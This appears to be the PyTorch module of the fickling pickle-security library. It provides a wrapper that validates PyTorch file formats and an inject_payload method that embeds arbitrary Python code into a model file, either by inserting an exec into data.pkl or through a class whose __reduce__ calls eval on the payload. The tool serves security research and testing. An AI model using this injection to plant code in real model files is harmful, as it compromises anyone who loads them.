from __future__ import annotations

import os
import warnings
import zipfile
from pathlib import Path

import fickling.polyglot
from fickling.fickle import Pickled

try:
    import torch
except ModuleNotFoundError:
    raise ImportError(
        "The 'torch' module is required for this functionality."
        "PyTorch is now an optional dependency in Fickling."
        "Please use `pip install fickling[torch]`"
    )


class BaseInjection(torch.nn.Module):
    # This class allows you to combine the payload and original model
    def __init__(self, original_model: torch.nn.Module, payload: str):
        super().__init__()
        self.original_model = original_model
        self.payload = payload

    def forward(self, *args, **kwargs):
        return self.original_model(*args, **kwargs)

    def __reduce__(self):
        return eval, (self.payload,)


class PyTorchModelWrapper:
    def __init__(self, path: Path, force: bool = False):
        self.path: Path = path
        self._pickled: Pickled | None = None
        self.force: bool = force
        self._formats: set[str] = set()

    def validate_file_format(self):
        self._formats = fickling.polyglot.identify_pytorch_file_format(self.path)
        """
        PyTorch v1.3 and TorchScript v1.4 are explicitly supported by PyTorchModelWrapper.
        This class may work on other file formats depending on its construction.
        To enable users to check that and load polyglots, the force argument exists.
        There is a warning for TorchScript v1.4 because of the scripting/tracing/mixing edge cases.
        For example, an injection may work on torch.load() but not torch.jit.load().
        """
        if len(self._formats) == 0:
            if self.force is True:
                warnings.warn(
                    """
                    This file has not been identified as a PyTorch file.
                    If it is a PyTorch file, raise an issue on GitHub
                    """,
                    UserWarning,
                )
            else:
                raise ValueError(
                    """
                    This file has not been identified as a PyTorch file.
                    If it is a PyTorch file, raise an issue on GitHub.
                    """
                )
        if ("PyTorch v1.3" not in self._formats) and ("TorchScript v1.4" not in self._formats):
            if "PyTorch v0.1.10" in self._formats:
                if self.force is True:
                    warnings.warn(
                        """
                        This file may be a PyTorch v0.1.10 file.
                        Try Pickled.load() or StackedPickle.load() if this fails
                        """,
                        UserWarning,
                    )
                else:
                    raise ValueError(
                        """
                        This file may be a PyTorch v0.1.10 file.
                        Try Pickled.load() or StackedPickle.load() instead
                        or use the argument `force=True`.
                        """
                    )
            else:
                if self.force is True:
                    warnings.warn(
                        """A fickling wrapper and injection method does not exist for that format.
                        Please raise an issue on our GitHub.""",
                        UserWarning,
                    )
                else:
                    raise NotImplementedError(
                        """A fickling wrapper and injection method does not exist for that format.
                        Please raise an issue on our GitHub or use the argument `force=True`."""
                    )
        if self._formats[0] == "TorchScript v1.4":
            warnings.warn(
                """Support for TorchScript v1.4 files is experimental.""",
                UserWarning,
            )
        return self._formats

    @property
    def formats(self):
        if not self._formats:
            self.validate_file_format()
        return self._formats

    @property
    def pickled(self) -> Pickled:
        if self._pickled is None:
            self.validate_file_format()
            with zipfile.ZipFile(self.path, "r") as zip_ref:
                data_pkl_path = next((name for name in zip_ref.namelist() if name.endswith("/data.pkl")), None)
                if data_pkl_path is None:
                    raise ValueError("data.pkl not found in the zip archive")
                with zip_ref.open(data_pkl_path, "r") as pickle_file:
                    self._pickled = Pickled.load(pickle_file)
        return self._pickled

    def inject_payload(self, payload: str, output_path: Path, injection: str = "all", overwrite: bool = False) -> None:
        self.output_path = output_path
        if self.formats[0] == "TorchScript v1.4":
            warnings.warn(
                """Support for TorchScript  v1.4 files is experimental.
                Injections may not be effective depending on the model and the target parser.""",
                UserWarning,
            )
        if injection == "insertion":
            # This does NOT bypass the weights based unpickler
            pickled = self.pickled

            pickled.insert_python_exec(payload)

            # Create a new ZIP file to store the modified data
            with zipfile.ZipFile(output_path, "w") as new_zip_ref:
                with zipfile.ZipFile(self.path, "r") as zip_ref:
                    for item in zip_ref.infolist():
                        with zip_ref.open(item.filename) as entry:
                            if item.filename.endswith("/data.pkl"):
                                new_zip_ref.writestr(item.filename, pickled.dumps())
                            else:
                                new_zip_ref.writestr(item.filename, entry.read())
        if injection == "combination":
            injected_model = BaseInjection(self.pickled, payload)
            torch.save(injected_model, output_path)
        if overwrite is True:
            # Rename the new file to replace the original file
            Path(output_path).rename(self.path)
            output_path = Path(self.output_path)
            if output_path.exists():
                os.remove(output_path)
